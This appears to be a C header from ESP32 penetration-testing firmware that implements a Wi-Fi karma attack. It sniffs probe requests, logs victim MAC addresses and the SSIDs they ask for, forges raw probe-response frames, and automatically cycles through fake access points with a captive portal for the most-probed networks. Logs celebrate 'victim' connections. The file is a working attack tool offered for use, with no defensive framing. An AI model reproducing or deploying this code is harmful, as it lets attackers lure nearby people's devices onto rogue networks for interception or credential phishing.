// wifi_karma.h - FIXED with proper AP management and connection tracking
#ifndef WIFI_KARMA_H
#define WIFI_KARMA_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "drivers/ap.h"
#define MAX_KARMA_SSIDS 50
#define KARMA_SSID_LEN 32

#include "esp_mac.h"

static uint8_t karma_running = 0;
static TaskHandle_t karma_task_handle = NULL;
static uint8_t karma_connected_clients = 0;
static uint32_t karma_total_connections = 0;

// Discovered networks from probe requests
typedef struct {
    char ssid[KARMA_SSID_LEN + 1];
    uint8_t victim_mac[6];
    int8_t rssi;
    uint32_t last_seen;
    uint16_t probe_count;
    uint8_t connected_count;  // Current connections to this SSID
    uint16_t total_connections;  // Total connections ever
} KarmaTarget;

static KarmaTarget karma_targets[MAX_KARMA_SSIDS];
static uint8_t karma_target_count = 0;
static uint8_t karma_active_ap = 0;
static char karma_current_ssid[KARMA_SSID_LEN + 1] = {0};

// Mode settings
typedef struct {
    uint8_t passive_only;
    uint8_t auto_respond;
    uint8_t rotate_ssids;
    uint16_t listen_time;
    uint16_t ap_time;
    uint8_t open_only;
    uint8_t min_probes;
} KarmaConfig;

static KarmaConfig karma_config = {
    .passive_only = 1,
    .auto_respond = 0,
    .rotate_ssids = 1,
    .listen_time = 5,
    .ap_time = 30,
    .open_only = 1,
    .min_probes = 2,
};

// Event handler for AP connections
static void karma_event_handler(void* arg, esp_event_base_t event_base,
                                int32_t event_id, void* event_data) {
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        karma_connected_clients++;
        karma_total_connections++;
        
        // Update target connection count
        for (uint8_t i = 0; i < karma_target_count; i++) {
            if (strcmp(karma_targets[i].ssid, karma_current_ssid) == 0) {
                karma_targets[i].connected_count++;
                karma_targets[i].total_connections++;
                break;
            }
        }
        
        ESP_LOGI(KARMA_TAG, "🎯 VICTIM CONNECTED to '%s': " MACSTR " (Total: %d)", 
                 karma_current_ssid, MAC2STR(event->mac), karma_connected_clients);
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        if (karma_connected_clients > 0) karma_connected_clients--;
        
        // Update target connection count
        for (uint8_t i = 0; i < karma_target_count; i++) {
            if (strcmp(karma_targets[i].ssid, karma_current_ssid) == 0) {
                if (karma_targets[i].connected_count > 0) {
                    karma_targets[i].connected_count--;
                }
                break;
            }
        }
        
        ESP_LOGI(KARMA_TAG, "Victim disconnected: " MACSTR " (Remaining: %d)", 
                 MAC2STR(event->mac), karma_connected_clients);
    }
}

// Generate random MAC for probe responses
static inline void karma_random_mac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;  // Locally administered, unicast
}

// Send probe response frame
static void karma_send_probe_response(const char *ssid, const uint8_t *dest_mac, uint8_t channel) {
    uint8_t packet[128];
    uint16_t pos = 0;
    
    // Generate random BSSID for this response
    uint8_t bssid[6];
    karma_random_mac(bssid);
    
    // Frame Control: Probe Response
    packet[pos++] = 0x50; packet[pos++] = 0x00;
    
    // Duration
    packet[pos++] = 0x00; packet[pos++] = 0x00;
    
    // Destination (victim MAC)
    memcpy(&packet[pos], dest_mac, 6); pos += 6;
    
    // Source (our fake BSSID)
    memcpy(&packet[pos], bssid, 6); pos += 6;
    
    // BSSID (same as source)
    memcpy(&packet[pos], bssid, 6); pos += 6;
    
    // Sequence number
    static uint16_t seq = 0;
    packet[pos++] = (seq & 0x0F) << 4;
    packet[pos++] = (seq >> 4) & 0xFF;
    seq++;
    
    // Fixed parameters (12 bytes)
    uint64_t timestamp = esp_timer_get_time();
    memcpy(&packet[pos], &timestamp, 8); pos += 8;
    
    // Beacon interval (100 TU = 102.4ms)
    packet[pos++] = 0x64; packet[pos++] = 0x00;
    
    // Capability info (ESS + Privacy if needed)
    packet[pos++] = 0x11; packet[pos++] = 0x04;  // ESS, Short Preamble
    
    // SSID element
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    packet[pos++] = 0x00;  // Element ID: SSID
    packet[pos++] = ssid_len;
    memcpy(&packet[pos], ssid, ssid_len); pos += ssid_len;
    
    // Supported rates
    packet[pos++] = 0x01;  // Element ID: Supported Rates
    packet[pos++] = 0x08;
    packet[pos++] = 0x82; packet[pos++] = 0x84;
    packet[pos++] = 0x8B; packet[pos++] = 0x96;
    packet[pos++] = 0x24; packet[pos++] = 0x30;
    packet[pos++] = 0x48; packet[pos++] = 0x6C;
    
    // DS Parameter Set
    packet[pos++] = 0x03;  // Element ID: DS Parameter
    packet[pos++] = 0x01;
    packet[pos++] = channel;
    
    // Send the probe response - use AP interface when available, otherwise STA
    // AP interface (1) works better for packet injection in promiscuous mode
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, pos, false);
    if (ret != ESP_OK) {
        // Fallback: try STA interface if AP fails
        esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
    }
}

// Promiscuous mode packet callback with active probe responses
static void karma_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || !karma_running) return;
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    const uint16_t frame_len = pkt->rx_ctrl.sig_len;
    
    if (frame_len < 26) return;
    
    // Check for probe request
    uint8_t frame_type = frame[0] & 0x0C;
    uint8_t frame_subtype = frame[0] & 0xF0;
    
    if (frame_type == 0x00 && frame_subtype == 0x40) {
        uint8_t victim_mac[6];
        memcpy(victim_mac, &frame[10], 6);
        
        if (frame_len < 28) return;
        
        const uint8_t *tags = &frame[24];
        uint16_t tags_len = frame_len - 24;
        
        if (tags_len < 2) return;
        if (tags[0] != 0x00) return;
        
        uint8_t ssid_len = tags[1];
        if (ssid_len == 0 || ssid_len > 32) return;
        if (tags_len < 2 + ssid_len) return;
        
        char ssid[KARMA_SSID_LEN + 1];
        memcpy(ssid, &tags[2], ssid_len);
        ssid[ssid_len] = '\0';
        
        ESP_LOGI(KARMA_TAG, "📡 Probe: %s from " MACSTR " (RSSI: %d)", 
                 ssid, MAC2STR(victim_mac), pkt->rx_ctrl.rssi);
        
        // NOTE: Probe responses disabled during promiscuous mode
        // The WiFi interfaces aren't set up correctly for packet injection
        // while in promiscuous/sniffer mode. This is an ESP32 limitation.
        // The fake AP itself is enough - devices will connect when they see it.
        
        // Check if we already have this SSID
        uint8_t found = 0;
        for (uint8_t i = 0; i < karma_target_count; i++) {
            if (strcmp(karma_targets[i].ssid, ssid) == 0) {
                karma_targets[i].probe_count++;
                karma_targets[i].last_seen = xTaskGetTickCount() * portTICK_PERIOD_MS;
                karma_targets[i].rssi = pkt->rx_ctrl.rssi;
                memcpy(karma_targets[i].victim_mac, victim_mac, 6);
                found = 1;
                break;
            }
        }
        
        // Add new SSID
        if (!found && karma_target_count < MAX_KARMA_SSIDS) {
            strncpy(karma_targets[karma_target_count].ssid, ssid, KARMA_SSID_LEN);
            karma_targets[karma_target_count].ssid[KARMA_SSID_LEN] = '\0';
            memcpy(karma_targets[karma_target_count].victim_mac, victim_mac, 6);
            karma_targets[karma_target_count].rssi = pkt->rx_ctrl.rssi;
            karma_targets[karma_target_count].last_seen = xTaskGetTickCount() * portTICK_PERIOD_MS;
            karma_targets[karma_target_count].probe_count = 1;
            karma_targets[karma_target_count].connected_count = 0;
            karma_targets[karma_target_count].total_connections = 0;
            karma_target_count++;
            
            ESP_LOGI(KARMA_TAG, "✨ New target: %s (Total: %d)", ssid, karma_target_count);
        }
    }
}

// Sort targets by probe count
static inline void karma_sort_by_activity(void) {
    for (uint8_t i = 0; i < karma_target_count - 1; i++) {
        for (uint8_t j = 0; j < karma_target_count - i - 1; j++) {
            if (karma_targets[j].probe_count < karma_targets[j + 1].probe_count) {
                KarmaTarget temp = karma_targets[j];
                karma_targets[j] = karma_targets[j + 1];
                karma_targets[j + 1] = temp;
            }
        }
    }
}

// Create fake AP for specific SSID
static inline uint8_t karma_create_fake_ap_internal(const char *ssid) {
    ESP_LOGI(KARMA_TAG, "🎭 Creating fake AP: %s", ssid);
    
    // Stop promiscuous mode
    esp_wifi_set_promiscuous(false);
    
    // Store current SSID
    strncpy(karma_current_ssid, ssid, KARMA_SSID_LEN);
    karma_current_ssid[KARMA_SSID_LEN] = '\0';
    
    // Register event handler if not already done
    static uint8_t event_registered = 0;
    if (!event_registered) {
        esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_AP_STACONNECTED, 
                                  &karma_event_handler, NULL);
        esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_AP_STADISCONNECTED, 
                                  &karma_event_handler, NULL);
        event_registered = 1;
    }
    
    // Reset client counter
    karma_connected_clients = 0;
    
    // Start captive portal
    captive_portal_start(ssid);
    karma_active_ap = 1;
    
    ESP_LOGI(KARMA_TAG, "✅ Fake AP broadcasting: %s", ssid);
    
    return 1;
}

// Stop current AP
static inline void karma_stop_current_ap(void) {
    if (karma_active_ap) {
        ESP_LOGI(KARMA_TAG, "Stopping fake AP: %s", karma_current_ssid);
        captive_portal_stop();
        
        // Give DNS server time to fully close socket
        vTaskDelay(pdMS_TO_TICKS(500));
        
        karma_active_ap = 0;
        karma_connected_clients = 0;
        karma_current_ssid[0] = '\0';
    }
}

// Auto-respond task
static void karma_auto_respond_task(void *param) {
    ESP_LOGI(KARMA_TAG, "🤖 Auto-respond task started");
    ESP_LOGI(KARMA_TAG, "Mode: Listen %ds → AP %ds → Repeat", 
             karma_config.listen_time, karma_config.ap_time);
    
    while (karma_running) {
        // ===== PHASE 1: LISTENING MODE =====
        ESP_LOGI(KARMA_TAG, "👂 Entering LISTEN mode for %d seconds", karma_config.listen_time);
        
        // Make sure any previous AP is stopped
        karma_stop_current_ap();
        vTaskDelay(pdMS_TO_TICKS(500));
        
        // Enable promiscuous mode
        esp_wifi_set_promiscuous_rx_cb(karma_sniffer_callback);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
        
        // Listen for configured time
        uint32_t listen_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
        while (karma_running && 
               (xTaskGetTickCount() * portTICK_PERIOD_MS - listen_start < karma_config.listen_time * 1000)) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        if (!karma_running) break;
        
        // Stop promiscuous before switching to AP
        esp_wifi_set_promiscuous(false);
        vTaskDelay(pdMS_TO_TICKS(200));
        
        // Sort targets by activity
        karma_sort_by_activity();
        
        // ===== PHASE 2: SELECT TARGET =====
        char target_ssid[KARMA_SSID_LEN + 1] = {0};
        uint8_t found_target = 0;
        
        for (uint8_t i = 0; i < karma_target_count; i++) {
            if (karma_targets[i].probe_count >= karma_config.min_probes) {
                strncpy(target_ssid, karma_targets[i].ssid, KARMA_SSID_LEN);
                found_target = 1;
                ESP_LOGI(KARMA_TAG, "🎯 Selected target: %s (%d probes)", 
                         target_ssid, karma_targets[i].probe_count);
                break;
            }
        }
        
        if (!found_target) {
            ESP_LOGI(KARMA_TAG, "⏭️  No targets meet threshold, continuing to listen");
            continue;
        }
        
        // ===== PHASE 3: FAKE AP MODE =====
        ESP_LOGI(KARMA_TAG, "📡 Entering AP mode for %d seconds", karma_config.ap_time);
        
        // Ensure previous AP is fully stopped before creating new one
        vTaskDelay(pdMS_TO_TICKS(200));
        
        // Create fake AP
        if (!karma_create_fake_ap_internal(target_ssid)) {
            ESP_LOGE(KARMA_TAG, "Failed to create fake AP");
            continue;
        }
        
        // Stay in AP mode for configured time
        uint32_t ap_start = xTaskGetTickCount() * portTICK_PERIOD_MS;
        while (karma_running && 
               (xTaskGetTickCount() * portTICK_PERIOD_MS - ap_start < karma_config.ap_time * 1000)) {
            
            // Log status every 5 seconds
            static uint32_t last_log = 0;
            uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
            if (now - last_log > 5000) {
                if (karma_connected_clients > 0) {
                    ESP_LOGI(KARMA_TAG, "💰 %d clients connected to '%s'", 
                             karma_connected_clients, target_ssid);
                }
                last_log = now;
            }
            
            vTaskDelay(pdMS_TO_TICKS(500));
        }
        
        if (!karma_running) break;
        
        // Log final connection stats
        if (karma_connected_clients > 0) {
            ESP_LOGI(KARMA_TAG, "📊 Cycle complete with %d active connections", 
                     karma_connected_clients);
        }
        
        // Stop AP before next cycle
        ESP_LOGI(KARMA_TAG, "🔄 Cycle complete, switching back to listen mode");
        karma_stop_current_ap();
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    // Cleanup
    esp_wifi_set_promiscuous(false);
    karma_stop_current_ap();
    
    ESP_LOGI(KARMA_TAG, "Auto-respond task stopped");
    karma_task_handle = NULL;
    vTaskDelete(NULL);
}

// Start karma with auto-respond
static inline uint8_t karma_start_auto_respond(void) {
    if (karma_running) return 0;
    
    ESP_LOGI(KARMA_TAG, "🚀 Starting AUTO-RESPOND karma attack");
    ESP_LOGI(KARMA_TAG, "⚙️  Config: Listen=%ds, AP=%ds, MinProbes=%d", 
             karma_config.listen_time, karma_config.ap_time, karma_config.min_probes);
    
    // Initialize WiFi
    static uint8_t wifi_init = 0;
    if (!wifi_init) {
        esp_err_t err;
        err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        // Use APSTA mode to allow packet injection during promiscuous
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
        ESP_ERROR_CHECK(esp_wifi_start());
        wifi_init = 1;
    }
    
    karma_running = 1;
    karma_config.auto_respond = 1;
    karma_total_connections = 0;
    
    // Start auto-respond task
    xTaskCreate(karma_auto_respond_task, "karma_auto", 4096, NULL, 5, &karma_task_handle);
    
    return 1;
}

// Start passive (listen only)
static inline uint8_t karma_start_passive(void) {
    if (karma_running) return 0;
    
    ESP_LOGI(KARMA_TAG, "Starting passive karma (probe collection only)");
    
    static uint8_t wifi_init = 0;
    if (!wifi_init) {
        esp_err_t err;
        err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
        
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        // Use APSTA mode for packet injection capability
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
        ESP_ERROR_CHECK(esp_wifi_start());
        wifi_init = 1;
    }
    
    esp_wifi_set_promiscuous_rx_cb(karma_sniffer_callback);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    
    karma_running = 1;
    karma_config.passive_only = 1;
    karma_config.auto_respond = 0;
    
    ESP_LOGI(KARMA_TAG, "Passive mode - listening for probes");
    return 1;
}

// Stop karma
static inline void karma_stop(void) {
    if (!karma_running) return;
    
    karma_running = 0;
    
    // Wait for task to finish
    uint8_t wait = 0;
    while (karma_task_handle && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    esp_wifi_set_promiscuous(false);
    karma_stop_current_ap();
    
    ESP_LOGI(KARMA_TAG, "Karma stopped - collected %d unique SSIDs, %d total connections", 
             karma_target_count, karma_total_connections);
}

void karma_menu_init(void); 

// Manual AP creation (for menu selection)
static inline uint8_t karma_create_fake_ap(const char *ssid) {
    return karma_create_fake_ap_internal(ssid);
}

// Get/set functions
static inline KarmaTarget* karma_get_target(uint8_t index) {
    if (index >= karma_target_count) return NULL;
    return &karma_targets[index];
}

static inline void karma_clear_targets(void) {
    karma_target_count = 0;
    karma_total_connections = 0;
    memset(karma_targets, 0, sizeof(karma_targets));
}

static inline void karma_get_stats(uint16_t *unique_ssids, uint16_t *total_probes) {
    *unique_ssids = karma_target_count;
    *total_probes = 0;
    for (uint8_t i = 0; i < karma_target_count; i++) {
        *total_probes += karma_targets[i].probe_count;
    }
}

void karma_menu_open(void);

static inline KarmaConfig* karma_get_config(void) {
    return &karma_config;
}

static inline uint8_t karma_is_running(void) {
    return karma_running;
}

static inline const char* karma_get_current_ap(void) {
    return karma_active_ap ? karma_current_ssid : NULL;
}

static inline uint8_t karma_is_auto_mode(void) {
    return karma_config.auto_respond;
}

static inline uint8_t karma_get_connected_clients(void) {
    return karma_connected_clients;
}

static inline uint32_t karma_get_total_connections(void) {
    return karma_total_connections;
}

#endif // WIFI_KARMA_H
